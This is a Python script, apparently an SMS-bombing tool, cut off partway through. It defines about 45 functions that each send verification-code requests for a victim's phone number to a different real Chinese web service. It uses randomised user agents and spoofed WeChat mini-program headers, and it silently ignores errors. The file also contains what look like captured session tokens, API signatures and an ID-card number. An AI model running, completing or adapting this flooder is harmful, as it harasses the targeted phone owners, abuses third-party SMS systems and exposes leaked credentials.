import requests
import random
import time

def generate_random_user_agent():
    android_versions = ['12', '13', '14', '15']
    devices = ['V2403A', 'V2404A', 'V2238A', 'V2324A', 'V2364A']
    builds = ['AP3A.240905.015.A1', 'AP1A.240505.005', 'AP2A.240605.003']
    chrome_version = f'138.0.{random.randint(7200, 7500)}.{random.randint(100, 200)}'
    return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(devices)} Build/{random.choice(builds)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36"

def replace_phone_in_data(data, phone):
    targets = ["13800000000", "15915637093", "15915637092", "15915637098", "15915637096", "13800000002", "15915838083", "13800085258", "13000000000", "13800000012"]
    if isinstance(data, str):
        for target in targets: data = data.replace(target, phone)
        return data
    elif isinstance(data, dict):
        return {k: replace_phone_in_data(v, phone) for k, v in data.items()}
    return data

# 发送器函数列表
def send_sms_1(phone):
    try:
        url = f"https://app-api.iyouya.com/app/memberAccount/captcha?mobile={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_2(phone):
    try:
        url = "https://yakeyun.ddsp.go2click.cn/mini/ortho/his/reg/smsApply"
        headers = {
            "Host": "yakeyun.ddsp.go2click.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "appletcode": "mlk",
            "applethid": "",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "logintoken": "24338847b5e0b7f61973a007d7c35a68",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx7e0a5d8de86658d5/176/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\",\"clientCode\":\"yky2020\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_3(phone):
    try:
        url = "https://ss.duya147.com/zba/api/sms"
        headers = {
            "Host": "ss.duya147.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": generate_random_user_agent(),
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "Content-Type": "application/json;charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ss.duya147.com",
            "X-Requested-With": "com.tencent.mobileqq",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ss.duya147.com/abz147/register",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = "{\"mobile\":\"13800000000\",\"flag\":1}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_4(phone):
    try:
        url = "https://api.yahedso.com/notification/codes/login"
        headers = {
            "Host": "api.yahedso.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "channel": "yahe-wechat-mini",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "sassappid": "0",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "eyJhbGciOiJIUzI1NiJ9.eyJsb2dpblRpbWUiOjE3NjU2MTMzMjA3MzAsImxvZ2luVHlwZSI6IldFQ0hBVCIsInVzZXJJZCI6MTk5OTc1MzMyNDA0MzE4MjA5MCwidXNlclNvdXJjZSI6IldFQ0hBVCJ9.eCKWy9UOKnLIj51wc-9oun8QhllP20lU9OT6z676inU",
            "Referer": "https://servicewechat.com/wx28364debdead316c/65/page-frame.html"
        }
        data = "{\"recv\":\"13800000000\",\"verifyValue\":\"111111\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_5(phone):
    try:
        url = "https://mp.dsssp.com/aw_api/v1/login/apiLoginAwService/sendSmsRegisterVerifyCode"
        headers = {
            "Host": "mp.dsssp.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "app-id": "wx10ad116a509bc468",
            "auth": "",
            "shop-id": "0",
            "sign": "338ED133CFFC3C0D330D6C3597B17FE1",
            "User-Agent": generate_random_user_agent(),
            "open-id": "o1tuS5IFsqsYjnB_PQbMhuEjH3UQ",
            "union-id": "ozzMA65SxsPOwTcgv84bXktICFkk",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "v": "1.0.14.34",
            "content-type": "application/json",
            "project-id": "2010156361",
            "store-puid": "82705",
            "ts": get_current_timestamp(),
            "Referer": "https://servicewechat.com/wx10ad116a509bc468/53/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\",\"areaCode\":\"\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_6(phone):
    try:
        url = "https://m.aldi.com.cn/ouser-web/mobileRegister/sendCaptchasCodeForm.do"
        cookies = {
            "locale": "zh_CN",
            "ut": "",
        }
        headers = {
            "Host": "m.aldi.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "p-system": "weChat",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded;text/html;charset=utf-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "cryptoversion": "621ed7c3d760780a3078f14f",
            "p-releasecode": "",
            "Referer": "https://servicewechat.com/wxcc73ef38a41c951a/373/page-frame.html"
        }
        data = "mobile=13800000000&captchasType=3"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_7(phone):
    try:
        url = f"https://www.ycfwcx.com:12399/GetVcodeAction.do?act=reg&mobilePhone={phone}"
        headers = {
            "Host": "www.ycfwcx.com:12399",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "text/xml;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx614f5d6294b6da99/41/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_8(phone):
    try:
        url = "https://www.concare.cn/concare/tms/external/sendSms"
        headers = {
            "Host": "www.concare.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "operatoraccount": "",
            "destination": "192.168.201.129:8045",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "operatorname": "",
            "Referer": "https://servicewechat.com/wx37257d2a7be330e6/240/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\",\"type\":2}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_9(phone):
    try:
        url = f"https://api.jiaoyuyun.org.cn/cpeducloud_api/api/login/sendVcodeNew?phone={phone}&sign=1&idCard=140427200209138078"
        headers = {
            "Host": "api.jiaoyuyun.org.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=utf8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxfc1992f8d36d24ae/59/page-frame.html"
        }
        data = "{}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_10(phone):
    try:
        url = f"https://bg-clean-app.56steel.com/code/sms?mobile={phone}&deviceId=7c4b3b44-8bfa-4ef3-b236-2fa9d9c7d403"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_11(phone):
    try:
        url = f"https://fms.zmd.com.cn/industry/api/applet/driver/getSmsRandomCode?phone={phone}&loginType=1"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_12(phone):
    try:
        url = f"https://proyiyunliapi.eyunli.com/api/sms/login?phoneNumber={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_13(phone):
    try:
        url = "https://scenter.gaojin.com.cn/api/gateway/api/identity/v3/verify-code"
        headers = {
            "Host": "scenter.gaojin.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "application-key": "6ad56a704a744a5980f7d8597be59378",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx8b03134380c41f67/27/page-frame.html"
        }
        data = "{\"type\":1,\"target\":\"13800000000\",\"checkAccount\":true}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_14(phone):
    try:
        url = f"https://tonghang.smartebao.com/oitTrade/applet/sms/sendLoginSms?phoneNo={phone}"
        headers = {
            "Host": "tonghang.smartebao.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "mobile-request": "true",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wxcabd5caa3b36fe7d/82/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_15(phone):
    try:
        url = "https://www.e-zhijian.com/wlhy168/sys/sms"
        headers = {
            "Host": "www.e-zhijian.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "x-access-token": "",
            "Referer": "https://servicewechat.com/wx0165148df5d6b027/18/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\",\"smsmode\":1,\"randomNumber\":\"\",\"randomKey\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_16(phone):
    try:
        url = f"https://pep.360scm.com/SCM.Mobile.WebApi/Driver/SendCheckCodes?phone={phone}"
        headers = {
            "Host": "pep.360scm.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx6ea25f54ced65ab8/20/page-frame.html"
        }
        data = "{}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_17(phone):
    try:
        url = "https://twebapi.chaojuntms.com/BaseManage/Home/SmsSend"
        headers = {
            "Host": "twebapi.chaojuntms.com",
            "Connection": "keep-alive",
            "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiJBZG1pbiIsIkV4cGlyZSI6IjIwMjAtMTItMDIgMgjvMzM6NTMuOTc5In0.q0p7t0UxzF8clSJudmSkwKO6fHzVCIae4EZ5cDnhYI0",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxdcc8492fea52479c/23/page-frame.html"
        }
        data = "{\"Moblie\":\"13000000000\",\"SmsCode\":\"\",\"OpenId\":\"\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_18(phone):
    try:
        url = "https://api.cx.chinasinai.com/proxyapi/msg/sendMsg"
        headers = {
            "Host": "api.cx.chinasinai.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wx456af3c40ce2cb75/222/page-frame.html"
        }
        data = "phone=13800000000"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_19(phone):
    try:
        url = f"https://napi.tudgo.com/logistics/driver/login/captcha?phone={phone}"
        headers = {
            "Host": "napi.tudgo.com",
            "Connection": "keep-alive",
            "authorization": "Bearer",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxdb81eba0fb33f8e1/24/page-frame.html"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_20(phone):
    try:
        url = f"https://gy.huajichen.com/tms/app/sms/sendAliCode?phone={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_21(phone):
    try:
        url = f"https://jqhaoyun.cn/api/base/mobilereg/sendcode/{phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_22(phone):
    try:
        url = "https://api.ddduo.01tiaodong.cn/proxyapi/msg/sendMsg"
        headers = {
            "Host": "api.ddduo.01tiaodong.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "",
            "Referer": "https://servicewechat.com/wx1d8ec8640fe8200e/282/page-frame.html"
        }
        data = "phone=13800000000"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_23(phone):
    try:
        url = "https://prod.java.56etms.com/xq-route-plan-tms/user/sendSmsCodeNoCheck"
        headers = {
            "Host": "prod.java.56etms.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "customer-type": "beta",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx2323bae3a815876d/125/page-frame.html"
        }
        data = "phone=13856312354"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_24(phone):
    try:
        url = "https://yiliuyunshu.cn/wlhyapi/getSmsCode"
        cookies = {
            "SHAREJSESSIONID": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146",
        }
        headers = {
            "Host": "yiliuyunshu.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "product": "app-wlhy-vhc",
            "ip": "111.38.169.240",
            "User-Agent": generate_random_user_agent(),
            "imei": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "osversion": "wechart-V2403A",
            "Referer": "https://servicewechat.com/wxff5f8ee7ca544929/15/page-frame.html"
        }
        data = "mobile=13800000002&productKey=weapp-wlhy-vhc&session3rd=d6d813d7-e3a4-4052-acd5-3d79bb791350"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_25(phone):
    try:
        url = "https://a.8m18.com/api/driver/login/verification_code"
        headers = {
            "Host": "a.8m18.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "location": "",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "tocker": "",
            "Referer": "https://servicewechat.com/wx2748049892e9eb92/23/page-frame.html"
        }
        data = "{\"tel\":\"13800000000\",\"pass\":\"\",\"code\":\"\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_26(phone):
    try:
        url = "https://weishop02.huanong1688.com/shop/s/guest/sendRegAuthCode"
        cookies = {
            "HNST_SHOP_USER_INFO_uk1635580563500826624": "",
        }
        headers = {
            "Host": "weishop02.huanong1688.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "sec-ch-ua-mobile": "?1",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": generate_random_user_agent(),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "token": "",
            "Origin": "https://weishop02.huanong1688.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://weishop02.huanong1688.com/uk1635580563500826624/register/index",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = "mobile=13800000000&businessType=1000&tenantId=uk1635580563500826624&lang=zh_CN"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_27(phone):
    try:
        url = f"https://admin.wumazhnmg.com/zmd-service-base/other/getSmsCode?mobile={phone}"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_28(phone):
    try:
        url = "https://sh.leakeyun.com/weapp/base/sendvalidate"
        headers = {
            "Host": "sh.leakeyun.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "company": "sxthf_TH2024",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx31a84ba4f865c5ca/5/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_29(phone):
    try:
        url = f"https://trade.sinvocloud.com/api/sms-code?mobile={phone}&source=0"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_30(phone):
    try:
        url = "https://member-purchase.hbxinfadi.com/api/open/member/sms"
        headers = {
            "Host": "member-purchase.hbxinfadi.com",
            "Connection": "keep-alive",
            "authorization": "111",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "app-version": "2.2.4",
            "Referer": "https://servicewechat.com/wx5e1817bd2ac2f220/204/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\",\"tdc_id\":81,\"PhoneDeviceInfo\":{\"brand\":\"apple\",\"deviceBrand\":\"apple\",\"deviceId\":\"17656331022864097366\",\"deviceModel\":\"V2404A\",\"deviceOrientation\":\"portrait\",\"devicePixelRatio\":3.5,\"model\":\"V2404A\",\"system\":\"Android 14\",\"networkType\":\"wifi\",\"isConnected\":true}}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_31(phone):
    try:
        url = "https://api.yutunyoupu.com/minch/merapi/sendsms"
        headers = {
            "Host": "api.yutunyoupu.com",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx0ddd39c7fdff6ff0/61/page-frame.html"
        }
        data = "{\"scene\":\"1\",\"mobile\":\"13800000000\",\"client_env\":\"wechat_mp\",\"client_platform\":\"android\",\"client_model\":\"V2404A\",\"client_system\":\"Android 15\",\"client_app_version\":\"1.0.0\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_32(phone):
    try:
        url = "https://v8mp.600vip.cn/api/GeneralInterface/SendValidationCode"
        headers = {
            "Host": "v8mp.600vip.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "mp_api_shopid": "",
            "content-type": "application/json",
            "mp_api_compcode": "18679393949",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx165676254d5f5c01/1/page-frame.html"
        }
        data = "{\"Mobile\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_33(phone):
    try:
        url = "https://www.scscb.online/addons/shopro/index/send"
        headers = {
            "Host": "www.scscb.online",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=UTF-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "platform": "WechatMiniProgram",
            "accept": "text/json",
            "token": "0ba1ae31-8ed0-4e8e-a4c0-610397d0d567",
            "Referer": "https://servicewechat.com/wx85239d4b1d35fd98/47/page-frame.html"
        }
        data = "{\"mobile\":\"13800000000\",\"event\":\"realinfo\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_34(phone):
    try:
        url = f"https://uc.17win.com/sms/v4/web/verificationCode/send?mobile={phone}&scene=bind&isVoice=N&appId=70774617641171202208031508899"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_35(phone):
    try:
        url = "https://mcpwxp.motherchildren.com/cloud/ppclient/msg/getauthcode"
        headers = {
            "Host": "mcpwxp.motherchildren.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx38285c6799dac2d1/284/page-frame.html"
        }
        data = "{\"organCode\":\"HXD2\",\"appCode\":\"HXFYAPP\",\"channelCode\":\"PATIENT_WECHAT_APPLET\",\"phoneNum\":\"13800000000\",\"busiCode\":\"hyt_account\",\"tempCode\":\"normal\",\"clientId\":\"ooo9znbykh\",\"needCheck\":false}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_36(phone):
    try:
        url = "https://omo.gstyun.cn/goapi/user/omo/sms"
        headers = {
            "Host": "omo.gstyun.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "intercept": "1",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx0aa0a2e081c3f0b7/402/page-frame.html"
        }
        current_ts = get_current_timestamp()
        data = f"{{\"phone\":{phone},\"omo_version\":\"1.4.114\",\"user_id\":\"\",\"timestamp\":\"{current_ts}\",\"channel_id\":1,\"sign_orig\":\"11.4.114{phone}{current_ts}\",\"sign\":\"01c3209c342e07d9173fe3ce25c8ec0a\"}}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_37(phone):
    try:
        url = "https://butler-ms.sf-express.com/gateway/auth/weChatUserInfo/sendVerificationCode"
        cookies = {
            "gray-version": "v6.30.0",
        }
        headers = {
            "Host": "butler-ms.sf-express.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "x-sf-anti-replay-nonce": f"{get_current_timestamp()}c1e3behnwpu",
            "origin": "https://butler-ms.sf-express.com",
            "User-Agent": generate_random_user_agent(),
            "x-sf-anti-replay-sign": "r21d7KUYocMYjPtiVy2NO1P/P0U1tibovuEUSTpL5j8UB57LdzG71krG5IBCpFL0",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "token": "F3A7s+q7/EOZg6BL+3L/1s+SjnZlDhK70aT6ojw61K/16n8i4FfXNGoOMrBidYAnHg1cxdrOB61JMXBd9D5r6A==",
            "content-type": "application/json",
            "x-sf-anti-replay-timestamp": get_current_timestamp(),
            "x-sf-change-path": "b2105f75e48397a337e97bd4e5316818f921d9ee97b413559bf438bfb4f728eb42af04633bf664f56b7eb660613e805ba1c56bed308dc5a327170cf4f6a32443",
            "Referer": "https://servicewechat.com/wxeaeb656b4553de99/460/page-frame.html"
        }
        data = "{\"userEmail\":\"13800000000\",\"verificationMethod\":1}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_38(phone):
    try:
        url = f"https://xcx.padtf.com/xcxapi/appuser.php?rec=getsjyzm&phone={phone}&msgtype=4&session_key=33839c2290cc900dab00e8b39cbda6bd"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_39(phone):
    try:
        url = f"https://www.yida178.cn/prod-api/sendRegisterCode/{phone}"
        headers = {
            "Host": "www.yida178.cn",
            "Connection": "keep-alive",
            "authorization": "Bearer undefined",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "content-language": "zh_CN",
            "Referer": "https://servicewechat.com/wxba8e24dcc66715a4/56/page-frame.html"
        }
        requests.put(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_40(phone):
    try:
        url = "https://ydcsmini.yundasys.com/gateway/interface"
        headers = {
            "Host": "ydcsmini.yundasys.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wx5e4e67fa47cfe658/351/page-frame.html"
        }
        current_ts = get_current_timestamp()
        data = f"{{\"appid\":\"wsrkg5oi7wuxe7sk\",\"version\":\"V1.0\",\"req_time\":{current_ts},\"action\":\"miniProgramService.miniProgramService.user.sendSms\",\"option\":false,\"data\":{{\"phone\":\"{phone}\"}}}}"
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_41(phone):
    try:
        url = "https://www.dxylbzj.com/api/app/sms/code"
        headers = {
            "Host": "www.dxylbzj.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json;charset=utf-8",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxa1d158d450bd2f57/9/page-frame.html"
        }
        data = "{\"phone\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_42(phone):
    try:
        url = "https://cx-hmb.zkydib.com/hmb-js26/api/v1/user/register/sms"
        cookies = {
            "_hmb_cx_sid_js26": "\"js26:wx882ece121b851496:ozRDP6ZsYbD7YPBZAWo19VNkVXmQ\"",
        }
        headers = {
            "Host": "cx-hmb.zkydib.com",
            "Connection": "keep-alive",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
            "X-PI-PRO-NUM": "CITY00000022",
            "sec-ch-ua-mobile": "?1",
            "User-Agent": generate_random_user_agent(),
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "projectId": "PJ000059",
            "Origin": "https://cx-hmb.zkydib.com",
            "X-Requested-With": "com.tencent.mobileqq",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://cx-hmb.zkydib.com/js26/?t=1765684968808",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        data = "{\"phoneNo\":\"13800000000\"}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, cookies=cookies, data=data, timeout=5)
    except:
        pass

def send_sms_43(phone):
    try:
        url = "https://api.hamptonhotels.com.cn/api/User/SendMobileCode"
        headers = {
            "Host": "api.hamptonhotels.com.cn",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": generate_random_user_agent(),
            "content-type": "application/json",
            "x-auth-header": "a0eemh+SwGEvHHT77TqR0ty9yqUPqYQjeY0wg4TJgOkFjF1ni3mjHxX2Z3dnKlKX9wJ3XViyZlpG423AnsOi/agDcnMElZbdIXqmKVemSQc7119hAzk1pmIoxuyyctlOugOAGN8Ii9ReUGPYTxQh8lTE7aBv2XV5q/ar/E0uFjetT1Y8IMbRWmw/WCp7x/Ad|1|" + get_current_timestamp(),
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxb9a76c5f2625cfc9/231/page-frame.html"
        }
        data = "{\"reqid\":35,\"mobile\":\"15915637092\",\"no_valid_code\":true}"
        data = replace_phone_in_data(data, phone)
        requests.post(url, headers=headers, data=data, timeout=5)
    except:
        pass

def send_sms_44(phone):
    try:
        url = f"https://w.argylehotels.com/hsgroup/api/sms-vcode?phoneNo={phone}&orgId=001"
        headers = {
            "User-Agent": generate_random_user_agent(),
            "Accept-Encoding": "gzip, deflate, br"
        }
        requests.get(url, headers=headers, timeout=5)
    except:
        pass

def send_sms_45(phone):
    try:
        url = "https://public.hikparking.com/api/driver/v2/api/sendVerifyCode"
        headers = {
            "Host": "public.hikparking.com",
            "Connection": "keep-alive",
            "authorization": "",
            "clienttype": "8",
            "charset": "utf-8",
